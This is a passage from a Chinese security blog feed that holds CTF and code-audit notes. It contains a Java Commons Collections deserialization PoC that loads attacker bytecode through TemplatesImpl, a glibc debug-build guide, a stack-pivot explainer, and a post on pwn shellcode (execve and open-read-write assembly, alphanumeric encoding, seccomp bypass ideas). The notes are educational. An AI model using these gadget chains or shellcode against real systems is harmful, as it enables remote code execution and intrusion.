tiedMapEntryClass = TiedMapEntry.class;<br>        Field tiedMapEntryKey = tiedMapEntryClass.getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        tiedMapEntryKey.setAccessible(<span class="hljs-keyword">true</span>);<br>        tiedMapEntryKey.set(tiedMapEntry, <span class="hljs-string">&quot;abc&quot;</span>);<br><br>        serialize(map1);<br>        unserialize();<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-keyword">new</span> File(fileName)));<br>        Object obj = ois.readObject();<br>        System.out.println(<span class="hljs-string">&quot;反序列化成功！！！&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">serialize</span><span class="hljs-params">(Object object)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(fileName));<br>        outputStream.writeObject(object);<br>        System.out.println(<span class="hljs-string">&quot;序列化成功！！！&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="instantiatetransformer">4.2、InstantiateTransformer</h3><p>调用链</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>readObject<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hashCode<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<br>           <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InstantiateTransformer</span>.</span></span>trasnform<br>               <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>newTransformer<br>                   <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>getTransletInstance<br>                       <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>defineTransletClasses<br>                           <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>defineClass<br>                               <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>defineClass<br></code></pre></td></tr></table></figure><p>Poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ms08067;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC3Test</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String fileName = <span class="hljs-string">&quot;ser.bin&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, TransformerConfigurationException </span>&#123;<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class tc = TemplatesImpl.class;<br><br>        <span class="hljs-comment">// 赋值 _name</span><br>        Field name = tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-keyword">true</span>);<br>        name.set(templates, <span class="hljs-string">&quot;name&quot;</span>);<br><br>        <span class="hljs-comment">// 赋值 _tfactory</span><br>        TransformerFactoryImpl fatcory = <span class="hljs-keyword">new</span> TransformerFactoryImpl();<br>        Field factory = tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        factory.setAccessible(<span class="hljs-keyword">true</span>);<br>        factory.set(templates, fatcory);<br><br>        <span class="hljs-comment">// 赋值 _bytecodes</span><br>        <span class="hljs-keyword">byte</span>[] codebyte = Files.readAllBytes(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;target/classes/com/ms08067/Evil.class&quot;</span>).toPath());<br>        <span class="hljs-keyword">byte</span>[][] myByteCodes = &#123;codebyte&#125;;<br>        Field bytecodes = tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-keyword">true</span>);<br>        bytecodes.set(templates, myByteCodes);<br><br>        <span class="hljs-comment">// templates.newTransformer();</span><br><br>        InstantiateTransformer instantiateTransformer = <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templates&#125;);<br><br>        <span class="hljs-comment">// instantiateTransformer.transform(TrAXFilter.class);</span><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;Object,Object&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, instantiateTransformer);<br><br>        <span class="hljs-comment">// 构造TiedMapEntry</span><br>        <span class="hljs-comment">// 注意传入的key存在（不存在才能触发反序列化）</span><br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap, <span class="hljs-string">&quot;value&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map1 = <span class="hljs-keyword">new</span> HashMap&lt;Object,Object&gt;();<br>        <span class="hljs-comment">// put方法也会触发hashCode</span><br>        map1.put(tiedMapEntry, <span class="hljs-keyword">null</span>);<br><br>        <span class="hljs-comment">//put后修改tiedMapEntry的key值为不存在</span><br>        Class tiedMapEntryClass = TiedMapEntry.class;<br>        Field tiedMapEntryKey = tiedMapEntryClass.getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        tiedMapEntryKey.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">// 注意这里给transform传参</span><br>        tiedMapEntryKey.set(tiedMapEntry, TrAXFilter.class);<br><br>        serialize(map1);<br>        unserialize();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-keyword">new</span> File(fileName)));<br>        Object obj = ois.readObject();<br>        System.out.println(<span class="hljs-string">&quot;反序列化成功！！！&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">serialize</span><span class="hljs-params">(Object object)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(fileName));<br>        outputStream.writeObject(object);<br>        System.out.println(<span class="hljs-string">&quot;序列化成功！！！&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>Code Audit</tag>
      
      <tag>notes</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>glibc调试环境搭建</title>
    <link href="/2023/12/27/blog0043-glibc%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2023/12/27/blog0043-glibc%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>我们在做题的时候，对于其他版本的glibc，在ret2libc的时候只需要使用glibc-all-in-one里面的libc-database即可。</p><p>但是有的时候，我们需要搭建glibc的调试环境，尤其是在学习堆的时候，这个时候我们就需要掌握多版本glibc调试环境的使用了。</p><span id="more"></span><h2 id="获取glibc源码">1、获取glibc源码</h2><p>获取当前系统的源码。如果需要获取对应系统的glibc可以直接拉一个docker下来，然后进容器直接拉取docker</p><p>拉取之后会在系统的特定路径下获取glibc源码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt install glibc-source<br>whereis glibc-*.**.tar.xz<br></code></pre></td></tr></table></figure><p>也可以使用git仓库获取</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone git://sourceware.org/git/glibc.git &amp;&amp; cd glibc<br>git checkout glibc-2.27<br></code></pre></td></tr></table></figure><h2 id="编译">2、编译</h2><p>进入glibc源码文件夹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir build &amp;&amp; cd build<br></code></pre></td></tr></table></figure><p>编译64位程序，注意--prefix指定安装位置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">../configure --prefix=/home/kali/glibc/glibc-2.23/out --enable-debug=yes --disable-werror<br>make -j4 &amp;&amp; sudo make install<br></code></pre></td></tr></table></figure><p>编译32位程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">../configure --prefix=/home/kali/glibc/glibc-2.23/out32 --enable-debug=yes --host=i686-linux-gnu --build=i686-linux-gnu --disable-werror CC=&quot;gcc -m32&quot; CXX=&quot;g++ -m32&quot; CFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&quot; CXXFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&quot;<br>make -j4 &amp;&amp; sudo make install<br></code></pre></td></tr></table></figure><h2 id="程序指定链接glibc">3、程序指定链接glibc</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -L/home/kali/glibc/glibc-2.23/out/lib -Wl,--rpath=/home/kali/glibc/glibc-2.23/out/lib/ -Wl,-I/home/kali/glibc/glibc-2.23/out/lib/ld-2.23.so 23_heap_test.c<br></code></pre></td></tr></table></figure><h2 id="patchelf">4、patchelf</h2><p>当我们在做pwn题的时候，可以利用本地的libc以及ld从而配置相应的binary运行环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">patchelf --set-interpreter ./ld-2.23.so ./libc-2.23.so<br>patchelf --set-interpreter ./ld-2.23.so ./chal<br>patchelf --replace-needed libc.so.6 ./libc-2.23.so ./chal<br></code></pre></td></tr></table></figure><h2 id="调试源码">5、调试源码</h2><p>如果我们需要调试glibc的源码，可以进入pwndbg后使用dir命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">dir /home/kali/glibc/glibc-2.23/malloc<br></code></pre></td></tr></table></figure><h2 id="错误与解决">6、错误与解决</h2><h3 id="实际编译报错">实际编译报错</h3><p>实际操作中可能会编译报错</p><p>我这边的编译环境是：kali 2021.2 + gcc (Debian 13.2.0-5) 13.2.0 + x64</p><p>编译语句如下</p><p>glibc-2.23</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">../configure --prefix=/home/kali/glibc/glibc-2.23/out --enable-debug=yes --enable-add-ons=libidn --enable-obsolete-nsl --disable-werror<br><br>../configure --prefix=/home/kali/glibc/glibc-2.23/out32 --enable-debug=yes --host=i686-linux-gnu --build=i686-linux-gnu  --enable-add-ons=libidn --enable-obsolete-nsl --disable-werror  CC=&quot;gcc -m32&quot; CXX=&quot;g++ -m32&quot; CFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error -fno-stack-protector&quot; CXXFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error -fno-stack-protector&quot; <br></code></pre></td></tr></table></figure><p>glibc-2.27</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">../configure --prefix=/home/kali/glibc/glibc-2.27/out --enable-debug=yes --disable-werror<br><br>../configure --prefix=/home/kali/glibc/glibc-2.27/out32 --enable-debug=yes --host=i686-linux-gnu --build=i686-linux-gnu --disable-werror CC=&quot;gcc -m32&quot; CXX=&quot;g++ -m32&quot; CFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og&quot; CXXFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og&quot;<br></code></pre></td></tr></table></figure><p>参考链接：</p><p>https://www.mail-archive.com/debian-glibc@lists.debian.org/msg57925.html</p><p>https://www.cnblogs.com/zq10/p/14314952.html</p><h3 id="报错找不到asmunistd.h">报错：找不到asm/unistd.h</h3><p>尝试使用如下命令</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo ln -s <span class="hljs-regexp">/usr/i</span>nclude<span class="hljs-regexp">/x86_64-linux-gnu/</span>asm <span class="hljs-regexp">/usr/i</span>nclude/asm <br></code></pre></td></tr></table></figure><h2 id="参考链接">7、参考链接</h2><p>https://0xffff.one/d/337</p>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
      <category>glibc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>二进制</tag>
      
      <tag>glibc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>栈迁移原理图示</title>
    <link href="/2023/12/25/blog0042-%E6%A0%88%E8%BF%81%E7%A7%BB%E5%8E%9F%E7%90%86%E5%9B%BE%E7%A4%BA/"/>
    <url>/2023/12/25/blog0042-%E6%A0%88%E8%BF%81%E7%A7%BB%E5%8E%9F%E7%90%86%E5%9B%BE%E7%A4%BA/</url>
    
    <content type="html"><![CDATA[<p>在花式栈溢出当中，当栈溢出的长度受到限制，不足以我们布栈（x86）或者写入gadgets（x64），这时候我们就可以考虑栈迁移。</p><span id="more"></span><p>栈迁移可以利用的一个重要条件，就是你能够获取到迁移后的地址。</p><p>无论你是泄露了栈地址还是跳转到bss段，前提是你确定这个地址，这样你才能够跳转到这个地址去完成函数调用或者gadgets的利用。</p><p>具体的利用并不是这篇文章的重点，这篇文章重点在于通过图示说明栈迁移是如何实现的。</p><p>首先，我们可以知道</p><ol type="1"><li>esp -&gt; 栈顶地址，ebp -&gt; 栈帧基地址 -&gt; 上一个栈帧的基地址</li><li>leave指令等价mov esp, ebp; pop ebp;</li><li>ret指令等价pop eip</li></ol><p>这是一个常规的栈</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0042/image-20231225215029022.png" alt="image-20231225215029022" /></p><p>执行leave之后变成如下的样子</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0042/image-20231225215150355.png" alt="image-20231225215150355" /></p><p>这里可以看到，我们可以使用栈溢出修改ebp的值，从而使栈帧的基地址改变。</p><p>但是这样esp的值没有改变，那么进入新函数的时候重新构造栈帧，就会导致你的覆写无效（这个逻辑很显然，在我们刚学re2text的时候，你把ebp随便覆写成什么东西都不会影响system的执行）。</p><p>如何修改esp呢，这里我们就重新用到了leave;ret的gadgets</p><p>通过leave指令，使得我们的esp被赋值为修改后的ebp，这样我们的即便构造新栈帧，也能够实现了迁移。</p><p>假设此时我们将ebp覆写至bss段，栈迁移的变化如下。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0042/image-20231225220554667.png" alt="image-20231225220554667" /></p>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
      <category>栈溢出</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈溢出</tag>
      
      <tag>二进制</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn中的shellcode利用</title>
    <link href="/2023/12/07/blog0041-pwn%E4%B8%AD%E7%9A%84shellcode%E5%88%A9%E7%94%A8/"/>
    <url>/2023/12/07/blog0041-pwn%E4%B8%AD%E7%9A%84shellcode%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>这篇文章主要讲讲Pwn中的shellcode利用，主要基于Linux操作系统。</p><span id="more"></span><h2 id="shellcode基础">shellcode基础</h2><p>shellcode指的是攻击者向可执行内存注入的代码。</p><p>从这段话可以看出两个点</p><ol type="1"><li>shellcode是一种代码</li><li>写入shellcode的空间必须具备执行权限</li></ol><p>当我们将程序的控制流劫持到shellcode处，shellcode便可以执行我们的命令，以下便是最常见的x86 shellcode。</p><p>通过x86的系统调用<code>execve</code>，运行<code>/bin/sh</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push   0x68732f2f<br>push   0x6e69622f<br>mov    ebx,esp<br>xor    ecx,ecx<br>xor    edx,edx<br>push   0xb<br>pop    eax<br>int    0x80<br></code></pre></td></tr></table></figure><p>同理x64的系统调用如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rdx, 0x68732f6e69622f<br>push rdx<br>mov rdi, rsp<br>xor rdx, rdx<br>xor rsi, rsi<br>mov rax, 59<br>syscall<br></code></pre></td></tr></table></figure><p>常见的orw shellcode如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov  rdx, 0x67616c662f<br>push rdx<br>mov rdi, rsp<br>xor rsi, rsi<br>xor rdx, rdx<br>mov rax, 2<br>syscall<br>mov rdi, rax<br>mov rsi, rsp<br>mov dl, 100<br>xor rax, rax<br>syscall<br>mov rdx, rax<br>mov rdi, 1<br>mov al, 1<br>syscall  <br></code></pre></td></tr></table></figure><h2 id="pwntools">pwntools</h2><p>如果留给shellcode的空间足够，我们通常使用pwntools自带的shellcode工具</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-built_in">print</span>(asm(shellcraft.sh()))<br><br><span class="hljs-comment"># open(file=&#x27;flag&#x27;, oflag=0, mode=0)</span><br>shellcraft.amd64.linux.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>)<br><span class="hljs-comment"># read(fd, buf, count)</span><br>shellcraft.amd64.linux.read(fd=<span class="hljs-number">0</span>, buffer=<span class="hljs-string">&#x27;rsp&#x27;</span>, count=<span class="hljs-number">8</span>)<br><span class="hljs-comment"># write(fd, buf, count)</span><br>shellcraft.amd64.linux.write(fd=<span class="hljs-number">1</span>, buffer=<span class="hljs-string">&#x27;rsp&#x27;</span>, count=<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><h2 id="shellcode-变形">shellcode 变形</h2><h3 id="可打印字符">可打印字符</h3><p>如果shellcode限制必须为可打印字符，我们可以借助一些工具来实现对shellcode的变形</p><p>这里推荐<a href="https://github.com/TaQini/alpha3.git">Alpha3</a>来完成这一操作</p><p>这里做简单的使用说明</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">// shellcode导出至二进制文件<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;shellcode&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>).write(asm(shellcraft.sh())<br></code></pre></td></tr></table></figure><p>然后调用如下命令完成shellcode的变形</p><p>其中参数rax表示存放shellcode地址的寄存器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">python ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;shellcode&quot;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 输出如下</span><br><span class="hljs-meta">#</span><span class="bash"> b<span class="hljs-string">&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br></code></pre></td></tr></table></figure><p>如果有的是限制非常严格，只能自己手写shellcode，可以参照以下资料</p><p><a href="https://nets.ec/Alphanumeric_shellcode">Alphanumeric_shellcode</a></p><p><a href="https://web.archive.org/web/20110716082815/http://skypher.com/wiki/index.php?title=X86_alphanumeric_opcodes">x86字符编码表</a></p><p><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php?title=X64_alphanumeric_opcodes">x64字符编码表</a></p><h3 id="长度限制">长度限制</h3><p>如果可以写shellcode的空间不足，我们必须缩减shellcode的长度。</p><p>缩减shellcode的常见思路如下</p><ol type="1"><li>巧妙借用前后被赋值的寄存器</li><li>尽量使用位数少的寄存器，如rax不如使用al</li></ol><p>当然，如果如果存在其他可写可执行的空间，可以将shellcode跳转过去，在其他足够的空间构建shellcode</p><h3 id="字符绕过">字符绕过</h3><p>有的时候可能存在需要绕过某些字符的情况，如果是非可见字符，那么可以使用刚刚的可打印字符绕过。</p><p>如果是一些opcode，例如<code>'\x0f\x05'</code>的情况，因为shellcode在内存中是<code>rwx</code>，因此我们完全可以在运行中修改shellcode中的值。</p><p>例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xor word ptr[rip], 0x959f<br>nop<br>nop<br></code></pre></td></tr></table></figure><p>解释一下这段shellcode，当程序运行到xor时，rip指向nop，取2个字节则为0x9090，再与0x959f异或就可以得到0x050f，因为是小端序，写入内存就是<code>'\x0f\x05'</code></p><p>由此，我们就得到绕过syscall的shellcode</p><h2 id="seccomp">seccomp</h2><p>seccomp可以用于限制某些系统调用，可以对shellcode做出有效的限制。</p><p>seccomp是在内核层面禁用系统调用，一般主要是针对rax的值进行检查。</p><h3 id="orw">ORW</h3><p>这个在shellcode基础提到过，通过调用open、read、write三个常见的系统调用，我们可以读取对应系统上的文件。那么获取flag文件也相对比较容易。</p><p>这里需要注意一下，glibc中的open函数实际是调用了<code>openat</code>系统调用，如果题目封禁了open，我们还是存在可以利用的空间。</p><h3 id="x86x64架构差异">x86/x64架构差异</h3><p>由于seccomp的检查是针对rax来做的，64位系统中使用32位系统调用，通过两者系统调用号的差异，从而完成绕过。</p><p>使用32位模式的方案有两种。</p><ul><li><p>retfq函数修改cs寄存器的值</p><p><a href="https://lingze.xyz/pages/07df2e/#使用32位的系统调用">qwb 2021 shellcode</a>.</p></li><li><p>syscall_number |= X32_SYSCALL_BIT (0x40000000)</p><p><a href="https://github.com/ktb88/2018_TDCTF/tree/master/pwnable/sandbox_school_5">TDctf2018 sandbox5</a></p></li></ul><h3 id="no-write">No write</h3><p>如果不允许直接输出的话，可以使用类似盲注的手段，在shellcode中加入cmp，往往可以使用时间盲注或者其他回来来达成效果。</p><p>可以参考这道题：</p><p><a href="https://lingze.xyz/pages/07df2e/#测信道时间爆破flag">qwb 2021 shellcode</a>.</p><h3 id="procselfmem注入">/proc/self/mem注入</h3><p>这里是另一个思路, 利用父子进程和<code>/proc/self/mem</code>的操作,</p><p>调用fork形成父子进程以后, 父进程再进行seccomp设置, 因此子进程不再沙盒内, 我们使用有限的系统调用向子进程内注入代码, 并利用子进程getshell,</p><p>具体题目是： <a href="https://github.com/google/google-ctf/tree/master/2020/quals/sandbox-writeonly">googlectf 2020: onlywrtie</a>.</p><h2 id="nop-sled">nop-sled</h2><p>sled的意思是滑动，即你的rip一旦指向这nop指令区域，那么rip最后迟早会执行到你的shellcode。</p><p>这里我们举一个简单的例子：</p><p>由于栈地址的随机化，有时候我们要枚举函数的返回地址。假设此刻你已经利用其他条件推测是返回地址是(0x401000,0x401010]，你只有一次猜的机会，那么你成功的概率是<span class="math 